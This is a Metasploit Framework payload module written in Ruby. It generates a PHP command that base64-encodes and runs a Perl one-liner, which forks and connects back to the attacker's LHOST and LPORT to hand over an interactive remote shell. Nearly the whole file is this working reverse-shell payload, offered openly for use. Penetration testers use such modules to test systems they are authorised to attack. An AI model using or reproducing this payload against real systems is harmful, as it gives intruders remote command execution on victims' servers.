##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Php

module ReversePerl

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command, Double reverse TCP connection (via perl)',
			'Version'       => '$Revision$',
			'Description'   => 'Creates an interactive shell via perl',
			'Author'        => 'cazz',
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + "system(base64_decode('#{Rex::Text.encode_base64(command_string)}'))"
	end
	
	#
	# Returns the command string to use for execution
	#
	def command_string
		cmd = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"#{datastore['LHOST']}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
	end

end

end end end end
